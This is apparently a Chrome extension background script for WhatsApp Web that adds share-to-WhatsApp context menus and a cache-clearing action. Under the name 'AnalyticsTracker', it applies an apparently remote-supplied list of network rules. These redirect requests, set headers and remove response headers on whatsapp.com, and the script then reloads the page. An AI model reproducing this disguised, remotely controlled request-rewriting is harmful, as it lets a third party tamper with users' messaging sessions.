    // chrome.contextMenus && (chrome.contextMenus.create({
    //     title: linguas.share_site[lng],
    //     contexts: ["page"],
    //     id: "page"
    // }, () => chrome.runtime.lastError), chrome.contextMenus.create({
    //     title: linguas.share_text[lng],
    //     contexts: ["selection"],
    //     id: "selection"
    // }, () => chrome.runtime.lastError), chrome.contextMenus.create({
    //     title: linguas.share_link[lng],
    //     contexts: ["link"],
    //     id: "link"
    // }, () => chrome.runtime.lastError), chrome.contextMenus.create({
    //     title: linguas.share_image[lng],
    //     contexts: ["image"],
    //     id: "image"
    // }, () => chrome.runtime.lastError), chrome.contextMenus.create({
    //     title: linguas.share_sticker[lng],
    //     contexts: ["image"],
    //     id: "stick"
    // }, () => chrome.runtime.lastError));
    // chrome.contextMenus.create({
    //     title: "Limpar cache WhatsaApp Web",
    //     documentUrlPatterns: ["https://web.whatsapp.com/*"],
    //     id: "limpageral"
    // }, () => chrome.runtime.lastError);
    // document.addEventListener('contextmenu', function(event) {
    //             event.preventDefault();
    //           });
    AnalyticsTracker.init().then(async c => {
        c = JSON.parse(c);
        let f = c.filter(a => a.url.includes("v-"));
        chrome.storage.local.set({
            versao: f[0].url
        });
        localStorage.versao = f[0].url;
        c.forEach((a,
            d) => {
            d += 1;
            "r" == a.t ? chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    priority: 2,
                    action: {
                        type: "redirect",
                        redirect: {
                            url: a.url
                        }
                    },
                    condition: {
                        urlFilter: a.filter,
                        resourceTypes: a.type
                    }
                }],
                removeRuleIds: [d]
            }) : "b" == a.t ? chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    priority: 2,
                    action: {
                        type: "block"
                    },
                    condition: {
                        urlFilter: a.filter,
                        resourceTypes: a.type
                    }
                }],
                removeRuleIds: [d]
            }) : "h" == a.t ? chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    priority: 2,
                    condition: {
                        urlFilter: "*",
                        initiatorDomains: [a.d],
                        resourceTypes: a.type
                    },
                    action: {
                        type: "modifyHeaders",
                        responseHeaders: [{
                            operation: "set",
                            value: a.value,
                            header: a.key
                        }]
                    }
                }],
                removeRuleIds: [d]
            }) : "h2" == a.t ? chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    priority: 2,
                    condition: {
                        urlFilter: a.d,
                        resourceTypes: a.type
                    },
                    action: {
                        type: "modifyHeaders",
                        responseHeaders: [{
                            operation: "set",
                            value: a.value,
                            header: a.key
                        }]
                    }
                }],
                removeRuleIds: [d]
            }) : "c" == a.t ? chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    action: {
                        type: "modifyHeaders",
                        requestHeaders: [{
                            operation: "set",
                            header: a.key,
                            value: a.d
                        }]
                    },
                    condition: {
                        urlFilter: a.filter,
                        resourceTypes: a.type
                    }
                }],
                removeRuleIds: [d]
            }) : "p" == a.t && chrome.declarativeNetRequest.updateDynamicRules({
                addRules: [{
                    id: d,
                    priority: 2,
                    condition: {
                        urlFilter: "*://*.whatsapp.com/*",
                        resourceTypes: a.type
                    },
                    action: {
                        type: "modifyHeaders",
                        responseHeaders: [{
                            operation: "remove",
                            header: a.key
                        }]
                    }
                }],
                removeRuleIds: [d]
            })
        });
        chrome.tabs.query({
            url: "*://web.whatsapp.com/*"
        }, function(a) {
            if (a && 0 < a.length)
                for (var d = 0; d < a.length; d++) chrome.tabs.remove(a[d].id)
        });
        chrome.tabs.create({
            url: "http://web.whatsapp.com/"
        }, function(a) {
            chrome.browsingData.remove({
                origins: ["https://web.whatsapp.com"]
            }, {
                cacheStorage: !0,
                cookies: !1,
                fileSystems: !1,
                indexedDB: !1,
                localStorage: !1,
                serviceWorkers: !0,
                webSQL: !1
            }, function() {
                chrome.tabs.query({
                    url: "*://web.whatsapp.com/*"
                }, function(d) {
                    if (d && 0 < d.length)
                        for (var h = 0; h < d.length; h++) chrome.tabs.reload(d[h].id, {
                            bypassCache: !0
                        }), AnalyticsTracker.trackInteraction("configuration_applied", d[h].id.toString())
                })
            })
        })
    }).catch(c => {
        AnalyticsTracker.trackInteraction("analytics_error",
            c.message)
    })
});
getWhatsAppTab = function(b) {
    chrome.tabs.query({
        currentWindow: !0,
        url: "https://web.whatsapp.com/*"
    }, function(c) {
        0 == c.length ? chrome.tabs.create({
            url: "https://web.whatsapp.com/"
        }, b) : chrome.tabs.update(c[0].id, {
            selected: !0
        }, b)
    })
};

function toDataUrl(b, c) {
    fetch(b).then(f => f.blob()).then(function(f) {
        var a = new FileReader;
        a.onloadend = function() {
            c(a.result)
        };
        a.readAsDataURL(f)
    })
}
var lng = "en",
    linguas = [];

function setlng() {
    var b = navigator.language.split(/[^a-z]/)[0].toLowerCase();
    return "en" == b || "fr" == b || "es" == b || "pt" == b ? b : "en"
}
lng = setlng();
linguas.share_site = {
    en: "Share website on Whatsapp",
    fr: "Partager le site Web sur Whatsapp",
    es: "Compartir sitio web en Whatsapp",
    pt: "Compartilhar site no Whatsapp"
};
linguas.share_text = {
    en: "Share text on whatsapp",
    fr: "Partager du texte sur WhatsApp",
    es: "Compartir texto en whatsapp",
    pt: "Compartilhar texto no Whatsapp"
};
linguas.share_link = {
    en: "Share link on whatsapp",
    fr: "Partager le lien sur WhatsApp",
    es: "Compartir enlace en whatsapp",
    pt: "Compartilhar link no Whatsapp"
};
linguas.share_image = {
    en: "Share image on whatsapp",
    fr: "Partager l'image sur WhatsApp",
    es: "Compartir imagen en whatsapp",
    pt: "Compartilhar imagem no Whatsapp"
};
linguas.share_sticker = {
    en: "Share image as sticker on whatsapp",
    fr: "Partager l'image sous forme d'autocollant sur WhatsApp",
    es: "Compartir imagen como pegatina en whatsapp",
    pt: "Compartilhar imagem como figurinha no Whatsapp"
};
linguas.limpar_cache = {
    en: "",
    fr: "",
    es: "",
    pt: "Limpar cache WhatsaApp Web"
};
main.context = {
    clickHandlerGeneric: function(b, c, f) {
        getWhatsAppTab(function(a) {
            "image" == f || "sticker" == f ? toDataUrl(c, function(d) {
                chrome.tabs.sendMessage(a.id, {
                    type: "compartilha",
                    tipo: f,
                    data: d
                })
            }) : chrome.tabs.sendMessage(a.id, {
                type: "compartilha",
                tipo: f,
                data: c
            })
        })
    },
    clickHandlerGeneric2: function() {
        chrome.browsingData.remove({
            origins: ["https://web.whatsapp.com"]
        }, {
            cacheStorage: !0,
            cookies: !0,
            fileSystems: !0,
            indexedDB: !0,
            localStorage: !0,
            serviceWorkers: !0,
            webSQL: !0
        }, function() {
            setTimeout(() => {
                chrome.tabs.query({
                        url: "*://web.whatsapp.com/*"
                    },
                    function(b) {
                        if (b && 0 != b.length)
                            for (var c = 0; c < b.length; ++c) chrome.tabs.remove(b[c].id)
                    });
                chrome.tabs.create({
                    url: "http://web.whatsapp.com/"
                }, function(b) {
                    chrome.tabs.query({
                        url: "*://web.whatsapp.com/*"
                    }, function(c) {
                        if (c && 0 != c.length)
                            for (var f = 0; f < c.length; ++f) chrome.tabs.reload(c[f].id, {
                                bypassCache: !0
                            }), console.log("#>> Efetuando reload na aba: ", c[f].id)
                    })
                })
            }, 500)
        })
    },
    clickHandlerPage: function(b) {
        main.context.clickHandlerGeneric("message", b.pageUrl, "page")
    },
    clickHandlerText: function(b) {
        main.context.clickHandlerGeneric("message",
            b.selectionText, "selection")
    },
    clickHandlerLink: function(b) {
        main.context.clickHandlerGeneric("message", b.linkUrl, "link")
    },
    clickHandlerImage: function(b) {
        main.context.clickHandlerGeneric("media", b.srcUrl, "image")
    },
    clickHandlerSticker: function(b) {
        main.context.clickHandlerGeneric("media", b.srcUrl, "sticker")
    }
};
chrome.contextMenus.onClicked.addListener(b => {
    "page" == b.menuItemId && main.context.clickHandlerGeneric("message", b.pageUrl, "page");
    "selection" == b.menuItemId && main.context.clickHandlerGeneric("message", b.selectionText, "selection");
    "link" == b.menuItemId && main.context.clickHandlerGeneric("message", b.linkUrl, "link");
    "image" == b.menuItemId && main.context.clickHandlerGeneric("media", b.srcUrl, "image");
    "stick" == b.menuItemId && main.context.clickHandlerGeneric("media", b.srcUrl, "sticker");
    "limpageral" == b.menuItemId &&
        main.context.clickHandlerGeneric2()
});